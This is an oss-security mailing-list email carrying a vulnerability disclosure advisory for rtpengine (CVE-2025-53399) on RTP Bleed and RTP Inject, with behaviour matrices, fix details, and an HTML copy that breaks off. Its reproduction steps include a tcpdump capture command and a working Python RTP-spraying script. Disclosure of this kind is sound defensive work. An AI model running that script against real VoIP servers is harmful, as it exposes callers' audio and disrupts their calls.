Received: (qmail 26403 invoked by uid 550); 31 Jul 2025 15:30:59 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 13425 invoked from network); 31 Jul 2025 05:03:12 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	enablesecurity.com; h=cc:cc:content-type:content-type:date:date
	:from:from:in-reply-to:message-id:mime-version:reply-to:subject
	:subject:to:to; s=fm1; t=1753938181; x=1754024581; bh=DuWT1TVWgv
	nbzmNy9UmTP2vohFI4LV59DDTfDqLd7Ps=; b=tQv6xrhYxgdL/EtOXTTyJ/iOGv
	VZVBTKPm5jCDAJT1EulJAhlYSlH8vYaJHULYt/bwsvu3Jt6JRL4PSE0KJnsxGdcJ
	lW7NFDUEvc4TnYIKrdp+G1e8aCBqLptjwBfCsZi1oFQ24JBmei3jFkce0BCOk2mC
	XM0QYdY77XJLfToNIAhAWsHkgOHP1tR0LALi6vvTy33XyFYwhZSmx2f47vDvc0N+
	5zTVnc2xfu+ISl+hWbZFBbIEEHwtB235Syx/Og5f0c6S9hJTUM6bgO59y1xmGElC
	nfo4aC9roE6CP5vdn9EM3Nllk2f/zxEDeDkHrnxKG2zMEx9bFTbNDwUjmaWQ==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=cc:cc:content-type:content-type:date:date
	:feedback-id:feedback-id:from:from:in-reply-to:message-id
	:mime-version:reply-to:subject:subject:to:to:x-me-proxy
	:x-me-sender:x-me-sender:x-sasl-enc; s=fm3; t=1753938181; x=
	1754024581; bh=DuWT1TVWgvnbzmNy9UmTP2vohFI4LV59DDTfDqLd7Ps=; b=l
	lZP9+1uagv5YGURw2iGMx+asDjSb3cu0j9kOoNhn7hSGth/G8xOIU149lp+lzJ2G
	XQkcIZPfP0vrAvmVxgo6xVGcO77LcxREqZfiQoiJN4gbdYkCU8upMJzC05QFOddW
	O+qAkbkx6KkaKPnTa5QJpV2cdmcQxnd/Bxr+xGp11oTvT7SSOeNieq6SdCmXLq3+
	79v5M7i6KzHQ4DoIKR68ZFHyAwR5JwCb6nwIrjTNzspfFx4nEpPyyNdGzFHFebfs
	6a2j7mIJ9zjQI6AHeKuZEUJ9ENJBCqni+/7dWGnthlLV9d4MQSQJxXOCJ96uzlIG
	qgJonrkggpA8VhMNZdUUg==
X-ME-Sender: <xms:A_mKaE0mGbmp4O4xkPu2jT_M6DNp11cf3mxlocoRDS2uXfwzKU9lYQ>
    <xme:A_mKaPGYEMU9mcHtdHI7PYURy9ZmV9bt6Y5USDrklbwinHNM9ROSW9HEHYRKRlHJi
    mzlLCXfbk7QLMlrEQ>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgeeffedrtdefgdelleelvdcutefuodetggdotefrod
    ftvfcurfhrohhfihhlvgemucfhrghsthforghilhdpuffrtefokffrpgfnqfghnecuuegr
    ihhlohhuthemuceftddtnecunecujfgurhepofggfffhvfevkffutgesrgdtreerredtje
    enucfhrhhomhepfdfurghnughrohcuifgruhgtihdfuceoshgrnhgurhhosegvnhgrsghl
    vghsvggtuhhrihhthidrtghomheqnecuggftrfgrthhtvghrnhepfeduiedvheegfeevge
    euveeludduvedtjedtfeettdeiteeliedvkeduieekudffnecuffhomhgrihhnpehfihhr
    shhtrdhorhhgpdgtvhgvrdhorhhgpdhgihhthhhusgdrtghomhdpvghnrggslhgvshgvtg
    hurhhithihrdgtohhmnecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehmrghi
    lhhfrhhomhepshgrnhgurhhosegvnhgrsghlvghsvggtuhhrihhthidrtghomhdpnhgspg
    hrtghpthhtohepledpmhhouggvpehsmhhtphhouhhtpdhrtghpthhtoheptggvrhhtqdgs
    uhhnugessghsihdrsghunhgurdguvgdprhgtphhtthhopegtvghrthestggvrhhtrdhorh
    hgpdhrtghpthhtoheprhhtphgvnhhgihhnvgesghhoohhglhgvghhrohhuphhsrdgtohhm
    pdhrtghpthhtohepshhrqdhushgvrhhssehlihhsthhsrdhkrghmrghilhhiohdrohhrgh
    dprhgtphhtthhopehushgvrhhssehlihhsthhsrdhophgvnhhsihhpshdrohhrghdprhgt
    phhtthhopehoshhsqdhsvggtuhhrihhthieslhhishhtshdrohhpvghnfigrlhhlrdgtoh
    hmpdhrtghpthhtohepshhusghmihhsshhiohhnshesphgrtghkvghtshhtohhrmhhsvggt
    uhhrihhthidrohhrghdprhgtphhtthhopehfuhhllhguihhstghlohhsuhhrvgesshgvtg
    hlihhsthhsrdhorhhgpdhrtghpthhtohepvhhoihhpshgvtgesvhhoihhpshgrrdhorhhg
X-ME-Proxy: <xmx:A_mKaHP8JoJgDH0gt6Kfb39RHNhKnjMd6KA1ATENxfjMnXjp57OXsA>
    <xmx:A_mKaH9Gb74d_f2gkVnOTq8NdmkBDvIemauES0QwP_4sVS0rWTp7Ag>
    <xmx:A_mKaBGHi8E4-SiI0RNLpTpl-5g_2IMzOIWCHO6vdyZj4AaQLTxbIw>
    <xmx:A_mKaOjY38f2kVGR0SzLayJzu3ESattix2hluT0NSMp-0KKWdpidBQ>
    <xmx:BfmKaBhhQUJEmpv97qG15DDUV6V_OWrxyRUGa3xvxIRBTrS1LP-iFbIa>
Feedback-ID: if8634316:Fastmail
X-Mailer: MessagingEngine.com Webmail Interface
MIME-Version: 1.0
X-ThreadId: Tf2678a4c77581987
Date: Thu, 31 Jul 2025 07:02:38 +0200
From: "Sandro Gauci" <sandro@enablesecurity.com>
To: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>
Cc: oss-security@lists.openwall.com, voipsec@voipsa.org,
 submissions@packetstormsecurity.org, cert@cert.org, cert-bund@bsi.bund.de,
 rtpengine@googlegroups.com, users@lists.opensips.org,
 sr-users@lists.kamailio.org
Message-Id: <6950250b-ff0e-4364-8178-82fe72ec0f98@app.fastmail.com>
Content-Type: multipart/alternative;
 boundary=d56d2e04d9dd4028b63cb2b4303402b7
Subject: [oss-security] Rtpengine: RTP Inject and RTP Bleed vulnerabilities despite proper
 configuration (CVSS v4.0 Score: 9.3 / Critical)

--d56d2e04d9dd4028b63cb2b4303402b7
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Rtpengine: RTP Inject and RTP Bleed vulnerabilities despite proper configur=
ation (CVSS v4.0 Score: 9.3 / Critical)

- CVSS v4.0
    - Exploitability: High
    - Complexity: Low
    - Vulnerable system: Medium
    - Subsequent system: Medium
    - Exploitation: High
    - Security requirements: High
    - Vector: https://www.first.org/cvss/calculator/4-0#CVSS:4.0/AV:N/AC:L/=
AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:H/SI:H/SA:H
- Other references: CVE-2025-53399 (https://www.cve.org/CVERecord?id=3DCVE-=
2025-53399)
- Fixed versions: >=3D mr13.4.1.1 (https://github.com/sipwise/rtpengine/rel=
eases/tag/mr13.4.1.1)
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tr=
ee/master/ES2025-01-rtpengine-improper-behavior-bleed-inject
- Tested vulnerable versions: mr13.3.1.4 and lower
- Timeline:
- First report: 2025-04-24
- Triaged: 2025-04-30
- Fix provided for testing: 2025-05-05
    - Various back and forth and more fixes: 2025-05 / 2025-06
    - Vendor applied all fixes satisfactorily to master branch: 2025-06-05
- Enable Security verified and confirmed fix: 2025-06-26
- Vendor release with fix (mr13.4.1.1): 2025-07-03
- Enable Security advisory: 2025-07-31


DESCRIPTION

Media servers often support source address learning to dynamically adapt to=
 network conditions and client behavior. This is especially useful in scena=
rios involving NAT where the source IP and port of incoming RTP packets may=
 differ from what was initially signaled via SDP over SIP. However, this me=
chanism can be exploited for two types of attacks if malicious packets are =
accepted as legitimate:

1. RTP Bleed - when a victim's media (e.g., audio) can be redirected to an =
attacker-controlled host
2. RTP Inject =E2=80=93 when attackers can insert arbitrary RTP packets int=
o active calls

Note: Neither of these attacks requires the attacker to act as a man-in-the=
-middle.

Additionally, when rtpengine relays SRTP packets in vulnerable versions, it=
 does not validate their authentication tag, also allowing RTP Bleed and RT=
P Inject despite the use of SRTP which should guarantee confidentiality and=
 integrity. Instead of dropping packets with missing or invalid authenticat=
ion tags, it forwards them for processing.

The purpose of this advisory is to describe security fixes that aim to full=
y address or at least mitigate these RTP Bleed and RTP Inject attacks where=
ver possible. While complete elimination of these vulnerabilities may not a=
lways be achievable due to the inherent nature of RTP learning mechanisms, =
the fixes provide significant improvements in security posture.

TECHNICAL DETAILS

Rtpengine provides the following learning modes through the --endpoint-lear=
ning option:

- delayed (default): waits 3 seconds before learning the source address fro=
m the first RTP packet received after the delay.

- immediate: learns the address from the very first incoming packet, with n=
o delay.

- no-learning: disables learning entirely, which is the only mode that is n=
ot vulnerable but can break connectivity for clients behind NAT.

- heuristic: combines a 3-second delay with a ranking system that prefers a=
ddresses matching the original SDP, falling back to partial matches or any =
observed address if necessary.

Additionally, rtpengine supports an optional strict source flag that forces=
 continued inspection of source addresses and ports of incoming RTP packets=
. It does this after the learning phase, enforcing what was previously lear=
ned. The strict source flag is meant to prevent RTP Inject but needs the le=
arning mode to work as expected for it to also work correctly.

The often recommended mitigation is to make use of SRTP, with the assumptio=
n that rtpengine would discard any RTP packets that fail the authentication=
 tag check. However, in rtpengine mr13.3.1.4 and lower, this was not found =
to be the case when using SDES-SRTP.

The following is a behavior matrix for rtpengine versions mr13.3.1.4 and lo=
wer showing different learning modes and flags. This table shows that none =
of the learning modes nor strict source mitigated the attacks described, ex=
cept for the combination of strict source with no-learning:

                    | Delayed       | Heuristic     | No learning         |=
 Immediate     |
no strict source    | Inject, Bleed | Inject, Bleed | Inject only         |=
 Inject, Bleed |
strict source       | Inject, Bleed | Inject, Bleed | No Inject or Bleed  |=
 Inject, Bleed |

The same behavior occurred whether rtpengine relayed plaintext RTP or SDES-=
SRTP. The heuristic flag did not prevent RTP Bleed or RTP Inject attacks, e=
ven when the correct IPs and ports are exchanged over SDP.

With the updated version, rtpengine's heuristic behavior was changed so tha=
t the learning modes behave as expected, giving administrators the opportun=
ity to mitigate these vulnerabilities while still handling NAT complexities.

The following is the same behavior matrix, but with the fixed version:

                    | Delayed       | Heuristic                | No learnin=
g   | Immediate     |
no strict source    | Inject, Bleed | Inject, <5 packets Bleed | Inject onl=
y   | Inject, Bleed |
strict source       | Inject, Bleed | <5 packets Inject, <5 packets Bleed |=
 No Inject or Bleed | Inject, Bleed |

This means that with the updated version, the heuristic mode limits attacks=
 to at most the first 5 packets for both injection and bleeding.
We believe that in many live environments, the recommended setup would be t=
o use heuristic learning with strict source, which keeps the flexibility of=
 endpoint learning while significantly mitigating RTP inject and RTP bleed =
attacks.

In the case of SDES-SRTP, we also recommend using heuristic learning mode w=
ith strict source, which keeps the flexibility of endpoint learning while m=
itigating RTP inject and RTP bleed. However, for complete protection with S=
RTP, a patch specific to SRTP was introduced by adding a new recrypt flag. =
This flag forces rtpengine to decrypt and then re-encrypt RTP packets, thus=
 validating the authentication tag before any further processing. This ensu=
res that unauthenticated packets are discarded. This new flag should be use=
d in addition to the previously recommended learning mode and flag.

Patched version behavior matrix for SDES-SRTP, with and without recrypt:

                    | Delayed            | Heuristic          | No-learning=
        | Immediate          |
Without recrypt     | Inject, Bleed      | Inject, <5 packets Bleed | Injec=
t only   | Inject, Bleed      |
With recrypt        | No Inject or Bleed | No Inject or Bleed | No Inject o=
r Bleed | No Inject or Bleed |

There is the special case of DTLS-SRTP, typically used for WebRTC environme=
nts, which was found vulnerable to RTP Bleed but not RTP Inject. This was d=
ue to the logic applied in this case, where learning mode occurred before t=
he RTP packets were properly validated. This has also received a security f=
ix.

IMPACT

In the case of plaintext RTP, this vulnerability allows attackers to perfor=
m RTP Inject as well as RTP Bleed. RTP Inject affects the integrity of the =
media while RTP Bleed affects the confidentiality of calls.=20

In cases where rtpengine is relaying plaintext RTP as well as when it relay=
s SRTP (in vulnerable versions), the vulnerabilities will cause Denial of S=
ervice because the RTP packets will be sent to the attacker instead of the =
legitimate recipient.

HOW TO REPRODUCE THE ISSUE

To reproduce this issue in a reliable manner, a security tester needs three=
 different parties each with their own IP address:

1. Vulnerable rtpengine server
2. An attacker node
3. A victim user node

Steps:

1. Run tcpdump on the attacker node to monitor for incoming packets from th=
e target:

    tcpdump -iany -w /tmp/rtpbleed.pcap src host <target_ip> and not icmp

2. Save the following Python script as sprayrtp.py:

    import socket, argparse

    parser =3D argparse.ArgumentParser(description=3D"Spray simple RTP pack=
ets over a port range")
    parser.add_argument("target", help=3D"Target IP address")
    parser.add_argument("start_port", type=3Dint, help=3D"First UDP port to=
 spray")
    parser.add_argument("end_port",   type=3Dint, help=3D"Last UDP port to =
spray")
    args =3D parser.parse_args()

    rtppacket=3D[0x80, 0x0, 0xee, 0x3c, 0x4, 0x42, 0xa2, 0xc1, 0xef, 0xa, 0=
x7, 0xde]
    rtppacket+=3D[0x0 for _ in range(160)]=20

    sock =3D socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for port in range(args.start_port, args.end_port + 1):
            sock.sendto(bytes(rtppacket), (args.target, port))

3. Run the script on the attacker node against the target:

    python3 sprayrtp.py <target_ip> <start_port> <end_port>

4. From the victim user node, place a number of calls that make use of SRTP.

5. Observe that tcpdump on the attacker node will show incoming packets fro=
m the vulnerable target.

Note: a SIP signaling server such as Kamailio or OpenSIPS is usually part o=
f the setup as well.


SOLUTIONS AND RECOMMENDATIONS

It is recommended to upgrade to a fixed version, and to either disable lear=
ning entirely or use the heuristic learning mode in conjunction with the st=
rict source flag. When using SDES-SRTP, it is recommended to use both stric=
t source and recrypt flags for complete protection. While fixes for the heu=
ristic mode were backported to earlier versions, the new recrypt flag is on=
ly available in the latest version. In the case of DTLS-SRTP, a fix was mad=
e so that SRTP validation occurs before learning mode. We highly recommend =
upgrading to access these security features.

The first version that includes the fixes is available at https://github.co=
m/sipwise/rtpengine/releases/tag/mr13.4.1.1.

ABOUT ENABLE SECURITY

Enable Security (https://www.enablesecurity.com) provides quality penetrati=
on testing to help protect your real-time communications systems against at=
tack.

DISCLAIMER

The information in the advisory is believed to be accurate at the time of p=
ublishing based on currently available information. Use of the information =
constitutes acceptance for use in an AS IS condition. There are no warranti=
es with regard to this information. Neither the author nor the publisher ac=
cepts any liability for any direct, indirect, or consequential loss or dama=
ge arising from use of, or reliance on, this information.

DISCLOSURE POLICY

This report is subject to Enable Security's vulnerability disclosure policy=
 which can be found at https://github.com/EnableSecurity/Vulnerability-Disc=
losure-Policy.

--d56d2e04d9dd4028b63cb2b4303402b7
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html><html><head><title></title></head><body><div><span class=3D"=
font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span c=
lass=3D"size" style=3D"font-size:88.89%;">Rtpengine: RTP Inject and RTP Ble=
ed vulnerabilities despite proper configuration (CVSS v4.0 Score: 9.3 / Cri=
tical)</span></span></div><div><span class=3D"font" style=3D"font-family:me=
nlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-s=
ize:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"fon=
t-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" styl=
e=3D"font-size:88.89%;">- CVSS v4.0</span></span></div><div><span class=3D"=
font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span c=
lass=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; - Exploitabili=
ty: High</span></span></div><div><span class=3D"font" style=3D"font-family:=
menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font=
-size:88.89%;">&nbsp;&nbsp;&nbsp; - Complexity: Low</span></span></div><div=
><span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans=
-serif;"><span class=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp=
; - Vulnerable system: Medium</span></span></div><div><span class=3D"font" =
style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=
=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; - Subsequent syste=
m: Medium</span></span></div><div><span class=3D"font" style=3D"font-family=
:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"fon=
t-size:88.89%;">&nbsp;&nbsp;&nbsp; - Exploitation: High</span></span></div>=
<div><span class=3D"font" style=3D"font-family:menlo, consolas, monospace, =
sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&=
nbsp; - Security requirements: High</span></span></div><div><span class=3D"=
font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span c=
lass=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; - Vector:&nbsp=
;</span></span><a href=3D"https://www.first.org/cvss/calculator/4-0#CVSS:4.=
0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:H/SI:H/SA:H"><span class=3D"fo=
nt" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span cla=
ss=3D"size" style=3D"font-size:88.89%;">https://www.first.org/cvss/calculat=
or/4-0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:H/SI:H/SA:H</spa=
n></span></a></div><div><span class=3D"font" style=3D"font-family:menlo, co=
nsolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.=
89%;">- Other references: CVE-2025-53399 (</span></span><a href=3D"https://=
www.cve.org/CVERecord?id=3DCVE-2025-53399"><span class=3D"font" style=3D"fo=
nt-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" sty=
le=3D"font-size:88.89%;">https://www.cve.org/CVERecord?id=3DCVE-2025-53399<=
/span></span></a><span class=3D"font" style=3D"font-family:menlo, consolas,=
 monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">)=
</span></span></div><div><span class=3D"font" style=3D"font-family:menlo, c=
onsolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88=
.89%;">- Fixed versions: &gt;=3D mr13.4.1.1 (</span></span><a href=3D"https=
://github.com/sipwise/rtpengine/releases/tag/mr13.4.1.1"><span class=3D"fon=
t" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span clas=
s=3D"size" style=3D"font-size:88.89%;">https://github.com/sipwise/rtpengine=
/releases/tag/mr13.4.1.1</span></span></a><span class=3D"font" style=3D"fon=
t-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" styl=
e=3D"font-size:88.89%;">)</span></span></div><div><span class=3D"font" styl=
e=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"si=
ze" style=3D"font-size:88.89%;">- Enable Security Advisory:&nbsp;</span></s=
pan><a href=3D"https://github.com/EnableSecurity/advisories/tree/master/ES2=
025-01-rtpengine-improper-behavior-bleed-inject"><span class=3D"font" style=
=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"siz=
e" style=3D"font-size:88.89%;">https://github.com/EnableSecurity/advisories=
/tree/master/ES2025-01-rtpengine-improper-behavior-bleed-inject</span></spa=
n></a></div><div><span class=3D"font" style=3D"font-family:menlo, consolas,=
 monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">-=
 Tested vulnerable versions: mr13.3.1.4 and lower</span></span></div><div><=
span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-s=
erif;"><span class=3D"size" style=3D"font-size:88.89%;">- Timeline:</span><=
/span></div><div><span class=3D"font" style=3D"font-family:menlo, consolas,=
 monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">-=
 First report: 2025-04-24</span></span></div><div><span class=3D"font" styl=
e=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"si=
ze" style=3D"font-size:88.89%;">- Triaged: 2025-04-30</span></span></div><d=
iv><span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sa=
ns-serif;"><span class=3D"size" style=3D"font-size:88.89%;">- Fix provided =
for testing: 2025-05-05</span></span></div><div><span class=3D"font" style=
=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"siz=
e" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; - Various back and forth =
and more fixes: 2025-05 / 2025-06</span></span></div><div><span class=3D"fo=
nt" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span cla=
ss=3D"size" style=3D"font-size:88.89%;">&nbsp;&nbsp;&nbsp; - Vendor applied=
 all fixes satisfactorily to master branch: 2025-06-05</span></span></div><=
div><span class=3D"font" style=3D"font-family:menlo, consolas, monospace, s=
ans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">- Enable Secur=
ity verified and confirmed fix: 2025-06-26</span></span></div><div><span cl=
ass=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;">=
<span class=3D"size" style=3D"font-size:88.89%;">- Vendor release with fix =
(mr13.4.1.1): 2025-07-03</span></span></div><div><span class=3D"font" style=
=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"siz=
e" style=3D"font-size:88.89%;">- Enable Security advisory: 2025-07-31</span=
></span></div><div><span class=3D"font" style=3D"font-family:menlo, consola=
s, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"=
></span></span><br></div><div><span class=3D"font" style=3D"font-family:men=
lo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-si=
ze:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font=
-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;">DESCRIPTION</span></span></div><div><span class=3D"f=
ont" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span cl=
ass=3D"size" style=3D"font-size:88.89%;"></span></span><br></div><div><span=
 class=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif=
;"><span class=3D"size" style=3D"font-size:88.89%;">Media servers often sup=
port source address learning to dynamically adapt to network conditions and=
 client behavior. This is especially useful in scenarios involving NAT wher=
e the source IP and port of incoming RTP packets may differ from what was i=
nitially signaled via SDP over SIP. However, this mechanism can be exploite=
d for two types of attacks if malicious packets are accepted as legitimate:=
</span></span></div><div><span class=3D"font" style=3D"font-family:menlo, c=
onsolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88=
.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font-fami=
ly:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"f=
ont-size:88.89%;">1. RTP Bleed - when a victim's media (e.g., audio) can be=
 redirected to an attacker-controlled host</span></span></div><div><span cl=
ass=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;">=
<span class=3D"size" style=3D"font-size:88.89%;">2. RTP Inject =E2=80=93 wh=
en attackers can insert arbitrary RTP packets into active calls</span></spa=
n></div><div><span class=3D"font" style=3D"font-family:menlo, consolas, mon=
ospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></spa=
n></span><br></div><div><span class=3D"font" style=3D"font-family:menlo, co=
nsolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.=
89%;">Note: Neither of these attacks requires the attacker to act as a man-=
in-the-middle.</span></span></div><div><span class=3D"font" style=3D"font-f=
amily:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D"font" st=
yle=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"=
size" style=3D"font-size:88.89%;">Additionally, when rtpengine relays SRTP =
packets in vulnerable versions, it does not validate their authentication t=
ag, also allowing RTP Bleed and RTP Inject despite the use of SRTP which sh=
ould guarantee confidentiality and integrity. Instead of dropping packets w=
ith missing or invalid authentication tags, it forwards them for processing=
.</span></span></div><div><span class=3D"font" style=3D"font-family:menlo, =
consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:8=
8.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font-fam=
ily:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"=
font-size:88.89%;">The purpose of this advisory is to describe security fix=
es that aim to fully address or at least mitigate these RTP Bleed and RTP I=
nject attacks wherever possible. While complete elimination of these vulner=
abilities may not always be achievable due to the inherent nature of RTP le=
arning mechanisms, the fixes provide significant improvements in security p=
osture.</span></span></div><div><span class=3D"font" style=3D"font-family:m=
enlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-=
size:88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"fo=
nt-family:menlo, consolas, monospace, sans-serif;"><span class=3D"size" sty=
le=3D"font-size:88.89%;">TECHNICAL DETAILS</span></span></div><div><span cl=
ass=3D"font" style=3D"font-family:menlo, consolas, monospace, sans-serif;">=
<span class=3D"size" style=3D"font-size:88.89%;"></span></span><br></div><d=
iv><span class=3D"font" style=3D"font-family:menlo, consolas, monospace, sa=
ns-serif;"><span class=3D"size" style=3D"font-size:88.89%;">Rtpengine provi=
des the following learning modes through the --endpoint-learning option:</s=
pan></span></div><div><span class=3D"font" style=3D"font-family:menlo, cons=
olas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89=
%;"></span></span><br></div><div><span class=3D"font" style=3D"font-family:=
menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font=
-size:88.89%;">- delayed (default): waits 3 seconds before learning the sou=
rce address from the first RTP packet received after the delay.</span></spa=
n></div><div><span class=3D"font" style=3D"font-family:menlo, consolas, mon=
ospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></spa=
n></span><br></div><div><span class=3D"font" style=3D"font-family:menlo, co=
nsolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.=
89%;">- immediate: learns the address from the very first incoming packet, =
with no delay.</span></span></div><div><span class=3D"font" style=3D"font-f=
amily:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=
=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D"font" st=
yle=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"=
size" style=3D"font-size:88.89%;">- no-learning: disables learning entirely=
, which is the only mode that is not vulnerable but can break connectivity =
for clients behind NAT.</span></span></div><div><span class=3D"font" style=
=3D"font-family:menlo, consolas, monospace, sans-serif;"><span class=3D"siz=
e" style=3D"font-size:88.89%;"></span></span><br></div><div><span class=3D"=
font" style=3D"font-family:menlo, consolas, monospace, sans-serif;"><span c=
lass=3D"size" style=3D"font-size:88.89%;">- heuristic: combines a 3-second =
delay with a ranking system that prefers addresses matching the original SD=
P, falling back to partial matches or any observed address if necessary.</s=
pan></span></div><div><span class=3D"font" style=3D"font-family:menlo, cons=
olas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89=
%;"></span></span><br></div><div><span class=3D"font" style=3D"font-family:=
menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font=
-size:88.89%;">Additionally, rtpengine supports an optional strict source f=
lag that forces continued inspection of source addresses and ports of incom=
ing RTP packets. It does this after the learning phase, enforcing what was =
previously learned. The strict source flag is meant to prevent RTP Inject b=
ut needs the learning mode to work as expected for it to also work correctl=
y.</span></span></div><div><span class=3D"font" style=3D"font-family:menlo,=
 consolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:=
88.89%;"></span></span><br></div><div><span class=3D"font" style=3D"font-fa=
mily:menlo, consolas, monospace, sans-serif;"><span class=3D"size" style=3D=
"font-size:88.89%;">The often recommended mitigation is to make use of SRTP=
, with the assumption that rtpengine would discard any RTP packets that fai=
l the authentication tag check. However, in rtpengine mr13.3.1.4 and lower,=
 this was not found to be the case when using SDES-SRTP.</span></span></div=
><div><span class=3D"font" style=3D"font-family:menlo, consolas, monospace,=
 sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></span></spa=
n><br></div><div><span class=3D"font" style=3D"font-family:menlo, consolas,=
 monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;">T=
he following is a behavior matrix for rtpengine versions mr13.3.1.4 and low=
er showing different learning modes and flags. This table shows that none o=
f the learning modes nor strict source mitigated the attacks described, exc=
ept for the combination of strict source with no-learning:</span></span></d=
iv><div><span class=3D"font" style=3D"font-family:menlo, consolas, monospac=
e, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"></span></s=
pan><br></div><div><span class=3D"font" style=3D"font-family:menlo, consola=
s, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89%;"=
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Delayed&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp; | Heuristic&nbsp;&nbsp;&nbsp;&nbsp; | No learning&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Immediate&nbsp;&nbsp;&nbsp;&nbsp; |</s=
pan></span></div><div><span class=3D"font" style=3D"font-family:menlo, cons=
olas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88.89=
%;">no strict source&nbsp;&nbsp;&nbsp; | Inject, Bleed | Inject, Bleed | In=
ject only&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Inject, Bleed |=
</span></span></div><div><span class=3D"font" style=3D"font-family:menlo, c=
onsolas, monospace, sans-serif;"><span class=3D"size" style=3D"font-size:88=
